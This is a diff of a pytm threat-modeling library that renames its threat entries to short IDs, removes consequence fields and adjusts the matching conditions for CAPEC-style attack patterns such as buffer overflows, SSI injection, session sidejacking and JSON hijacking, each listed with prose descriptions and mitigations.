@@ -1,9 +1,9 @@
-from pytm.pytm import Dataflow, Element, Server, Actor, Datastore, Process, SetOfProcesses, Lambda, ExternalEntity
+from pytm.pytm import Element, Server, Actor, Datastore, Process, SetOfProcesses, Lambda, ExternalEntity, Dataflow, Boundary
 
 ''' Add threats here '''
 Threats = {
 
-  "Buffer Overflow via Environment Variables": {
+  "IN01": {
    "SID":"1",
    "target": (Lambda,Process),
    "description": "Buffer Overflow via Environment Variables",
@@ -11,12 +11,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.usesEnvironmentVariables is True and target.sanitizesInput is False and target.checksInputBounds is False",
-   "Prerequisites": "The application uses environment variables.An environment variable exposed to the user is vulnerable to a buffer overflow.The vulnerable environment variable uses untrusted data.Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges",
+   "prerequisites": "The application uses environment variables.An environment variable exposed to the user is vulnerable to a buffer overflow.The vulnerable environment variable uses untrusted data.Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.",
    "mitigations": "Do not expose environment variable to the user.Do not use untrusted data in your environment variables. Use a language or compiler that performs automatic bounds checking. There are tools such as Sharefuzz [R.10.3] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.",
    "example": "Attack Example: Buffer Overflow in $HOME A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable. Attack Example: Buffer Overflow in TERM A buffer overflow in the rlogin program involves its consumption of the TERM environmental variable."
  },
- "Overflow Buffers": {
+ "IN02": {
    "SID":"2",
    "target": Process,
    "description": "Overflow Buffers",
@@ -24,25 +23,23 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.checksInputBounds is False",
-   "Prerequisites": "Targeted software performs buffer operations.Targeted software inadequately performs bounds-checking on buffer operations.Adversary has the capability to influence the input to buffer operations.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges",
+   "prerequisites": "Targeted software performs buffer operations.Targeted software inadequately performs bounds-checking on buffer operations.Adversary has the capability to influence the input to buffer operations.",
    "mitigations": "Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.",
    "example": "The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process."
  },
- "Server Side Include (SSI) Injection": {
+ "IN03": {
    "SID":"3",
    "target": Server,
    "description": "Server Side Include (SSI) Injection",
    "details": "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.",
    "Likelihood Of Attack": "High",
    "severity": "High",
-   "condition": "target.sanitizesInput is False and target.encodesOutput is False",
-   "Prerequisites": "A web server that supports server side includes and has them enabledUser controllable input that can carry include directives to the web server",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code",
+   "condition": "target.sanitizesInput is False or target.encodesOutput is False",
+   "prerequisites": "A web server that supports server side includes and has them enabledUser controllable input that can carry include directives to the web server",
    "mitigations": "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.",
    "example": "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them."
  },
- "Session Sidejacking": {
+ "CR01": {
    "SID":"4",
    "target": (Dataflow, Server),
    "description": "Session Sidejacking",
@@ -50,64 +47,59 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "(target.protocol == 'HTTP' or target.usesVPN is False) and target.usesSessionTokens is True",
-   "Prerequisites": "An attacker and the victim are both using the same WiFi network.The victim has an active session with a target system.The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution",
+   "prerequisites": "An attacker and the victim are both using the same WiFi network.The victim has an active session with a target system.The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token",
    "mitigations": "Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel. Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.",
    "example": "The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, he has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but his e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account."
  },
- "HTTP Request Splitting": {
+ "IN04": {
    "SID":"5",
    "target": Server,
    "description": "HTTP Request Splitting",
    "details": "HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two. There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a Transfer Encoding: chunked in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the Double CR in an HTTP header technique. There are also a few less general techniques targeting specific parsing vulnerabilities in certain web servers.",
    "Likelihood Of Attack": "Medium",
    "severity": "High",
-   "condition": "target.validatesInput is False and target.validatesHeaders is False and target.protocol =='HTTP'",
-   "Prerequisites": "User-manipulateable HTTP Request headers are processed by the web server",
-   "Consequences": "SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary CodeSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:IntegrityTECHNICAL IMPACT:Modify Data",
+   "condition": "(target.validatesInput is False or target.validatesHeaders is False) and target.protocol =='HTTP'",
+   "prerequisites": "User-manipulateable HTTP Request headers are processed by the web server",
    "mitigations": "Make sure to install the latest vendor security patches available for the web server. If possible, make use of SSL. Install a web application firewall that has been secured against HTTP Request Splitting. Use web servers that employ a tight HTTP parsing process.",
    "example": "Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote attacker to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows attackers to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the attacker to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates"
  },
- "Cross Site Tracing": {
+ "CR02": {
    "SID":"6",
    "target": (Dataflow, Server),
    "description" : "Cross Site Tracing",
    "details": "Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to destination system's web server. The adversary first gets a malicious script to run in the victim's browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the document.cookie object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable him or her to get around the same origin policy protection.",
    "Likelihood Of Attack": "Medium",
    "severity": "Very High",
-   "condition": "(target.protocol == 'HTTP' and target.usesSessionTokens is True) and (target.sanitizesInput is False and target.encodesOutput is False)",
-   "Prerequisites": "HTTP TRACE is enabled on the web serverThe destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policyScripting is enabled in the client's browserHTTP is used as the communication protocol between the server and the client",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:IntegrityTECHNICAL IMPACT:Modify Data",
+   "condition": "(target.protocol == 'HTTP' and target.usesSessionTokens is True) and (target.sanitizesInput is False or target.validatesInput is False)",
+   "prerequisites": "HTTP TRACE is enabled on the web serverThe destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policyScripting is enabled in the client's browserHTTP is used as the communication protocol between the server and the client",
    "mitigations": "Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default. Patch web browser against known security origin policy bypass exploits.",
    "example": "An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with his malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system."
  },
- "Command Line Execution through SQL Injection": {
+ "IN05": {
    "SID":"7",
-   "target": (Process, Datastore),
+   "target": Server,
    "description": "Command Line Execution through SQL Injection",
    "details": "An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.",
    "Likelihood Of Attack": "Low",
    "severity": "Very High",
-   "condition": "target.isSQL is True and target.validatesInput is False",
-   "Prerequisites": "The application does not properly validate data before storing in the databaseBackend application implicitly trusts the data stored in the databaseMalicious data is used on the backend as a command line argument",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code",
+   "condition": "target.validatesInput is False",
+   "prerequisites": "The application does not properly validate data before storing in the databaseBackend application implicitly trusts the data stored in the databaseMalicious data is used on the backend as a command line argument",
    "mitigations": "Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).",
    "example": "SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function"
  },
- "SQL Injection through SOAP Parameter Tampering": {
+ "IN06": {
    "SID":"8",
-   "target": (Dataflow, Server), 
+   "target": Server, 
    "description": "SQL Injection through SOAP Parameter Tampering",
    "details": "An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.",
    "Likelihood Of Attack": "High",
    "severity": "Very High", 
    "condition": "target.protocol == 'SOAP' and (target.sanitizesInput is False or target.validatesInput is False)",
-   "Prerequisites": "SOAP messages are used as a communication mechanism in the systemSOAP parameters are not properly validated at the service providerThe service provider does not properly utilize parameter binding when building SQL queries",
-   "Consequences": "SCOPE:IntegrityTECHNICAL IMPACT:Modify DataSCOPE:AvailabilityTECHNICAL IMPACT:Unreliable ExecutionSCOPE:ConfidentialityTECHNICAL IMPACT:Read DataSCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain PrivilegesSCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code",
+   "prerequisites": "SOAP messages are used as a communication mechanism in the systemSOAP parameters are not properly validated at the service providerThe service provider does not properly utilize parameter binding when building SQL queries",
    "mitigations": "Properly validate and sanitize/reject user input at the service provider. Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query. At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.",
    "example": "An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. He notices that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies his payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure."
  },
- "JSON Hijacking (aka JavaScript Hijacking)": {
+ "SC01": {
    "SID":"9",
    "target": Process,
    "description": "JSON Hijacking (aka JavaScript Hijacking)",
@@ -115,12 +107,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "High",
    "condition": "target.implementsNonce is False and target.data =='JSON'",
-   "Prerequisites": "JSON is used as a transport mechanism between the client and the serverThe target server cannot differentiate real requests from forged requestsThe JSON object returned from the server can be accessed by the attackers' malicious code via a script tag",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "JSON is used as a transport mechanism between the client and the serverThe target server cannot differentiate real requests from forged requestsThe JSON object returned from the server can be accessed by the attackers' malicious code via a script tag",
    "mitigations": "Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce. On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags). Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session. 4. Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.",
    "example": "Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when he or she receives it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail. When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker."
  },
- "API Manipulation": {
+ "LB01": {
    "SID":"10",
    "target": (Process, Lambda),
    "description": "API Manipulation",
@@ -128,25 +119,23 @@ Threats = {
    "Likelihood Of Attack": "Medium",
    "severity": "Medium",
    "condition": "target.implementsAPI is True and (target.validatesInput is False or target.sanitizesInput is False)",
-   "Prerequisites": "The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.",
-   "Consequences": "",
+   "prerequisites": "The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.",
    "mitigations": "Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.",
    "example": "Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc."
  },
- "Authentication Abuse/ByPass": {
+ "AA01": {
    "SID":"11",
    "target": (Server, Process), 
    "description": "Authentication Abuse/ByPass",
    "details": "An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.",
    "Likelihood Of Attack": "",
    "severity": "Medium",
-   "condition": "target.authenticatesSource is False or target.implementsAuthenticationScheme is True",
-   "Prerequisites": "An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.",
-   "Consequences": "",
+   "condition": "target.authenticatesSource is False",
+   "prerequisites": "An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.",
    "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.",
    "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information."
  },
- "Excavation": {
+ "DS01": {
    "SID":"12",
    "target": Server,
    "description": "Excavation",
@@ -154,12 +143,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Medium",
    "condition":"(target.sanitizesInput is False or target.validatesInput is False) or target.encodesOutput is False",
-   "Prerequisites": "An adversary requires some way of interacting with the system.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "An adversary requires some way of interacting with the system.",
    "mitigations": "Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application's functionality.",
    "example": "The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary."
  },
- "Interception": {
+ "DE01": {
    "SID":"13",
    "target":Dataflow,
    "description": "Interception",
@@ -167,12 +155,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "Medium",
    "condition":"target.protocol == 'HTTP' or target.isEncrypted is False",
-   "Prerequisites": "The target must transmit data over a medium that is accessible to the adversary.",
-   "Consequences": "SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data",
+   "prerequisites": "The target must transmit data over a medium that is accessible to the adversary.",
    "mitigations": "Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.",
    "example": "Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact."
  },
- "Double Encoding": {
+ "DE02": {
    "SID":"14",
    "target": (Server, Process),
    "description": "Double Encoding",
@@ -180,12 +167,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "Medium", 
    "condition": "target.validatesInput is False or target.sanitizesInput is False",
-   "Prerequisites": "The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.The application accepts and decodes URL string request.The application performs insufficient filtering/canonicalization on the URLs.",
-   "Consequences": "",
+   "prerequisites": "The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.The application accepts and decodes URL string request.The application performs insufficient filtering/canonicalization on the URLs.",
    "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).",
    "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code."
  },
- "Exploit Test APIs": {
+ "API01": {
    "SID":"15",
    "target":(Process,Lambda),
    "description": "Exploit Test APIs",
@@ -193,12 +179,11 @@ Threats = {
    "Likelihood Of Attack": "Low",
    "severity": "High",
    "condition": "target.implementsAPI is True",
-   "Prerequisites": "The target must have installed test APIs and failed to secure or remove them when brought into a production environment.",
-   "Consequences": "",
+   "prerequisites": "The target must have installed test APIs and failed to secure or remove them when brought into a production environment.",
    "mitigations": "Ensure that production systems to not contain sample or test APIs and that these APIs are only used in development environments.",
    "example": "Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc."
  },
- "Privilege Abuse": {
+ "AC01": {
    "SID": "16",
    "target": (Server, Process, Datastore),
    "description": "Privilege Abuse",
@@ -206,12 +191,11 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition":"target.hasAccessControl is False or target.authorizesSource is False",
-   "Prerequisites": "The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.",
-   "Consequences": "",
+   "prerequisites": "The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.",
    "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.",
    "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information."
  },
- "Buffer Manipulation": {
+ "IN07": {
    "SID":"17",
    "target": Process,
    "description": "Buffer Manipulation",
@@ -219,12 +203,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Very High",
    "condition": "target.usesSecureFunctions is False",
-   "Prerequisites": "The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.",
-   "Consequences": "SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:NOTE:Availability Unreliable Execution A buffer manipulation attack often results in a crash of the application due to the corruption of memory.SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data:NOTE:Confidentiality Execute Unauthorized Commands Modify Data Read Data If constructed properly, a buffer manipulation attack can be used to contol the execution of the application leading to any number of negative consequenses.",
+   "prerequisites": "The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.",
    "mitigations": "To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.",
    "example": "Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction."
  },
- "Shared Data Manipulation": {
+ "AC02": {
    "SID": "18",
    "target": Datastore,
    "description": "Shared Data Manipulation",
@@ -232,12 +215,11 @@ Threats = {
    "Likelihood Of Attack": "",
    "severity": "Medium",
    "condition": "target.isShared is True",
-   "Prerequisites": "The target applications (or target application threads) must share data between themselves.The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.",
-   "Consequences": "",
+   "prerequisites": "The target applications (or target application threads) must share data between themselves.The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.",
    "mitigations": "Use strong authentication and authorization mechanisms. Use HTTPS/SSL for communication.",
    "example": "Adversary was able to compromise one of the sharing applications or data stores in order to manipulate shared data."
  },
- "Flooding": {
+ "DO01": {
    "SID": "19",
    "target": (Process, Server),
    "description": "Flooding",
@@ -245,12 +227,11 @@ Threats = {
    "Likelihood Of Attack": "High",
    "severity": "Medium",
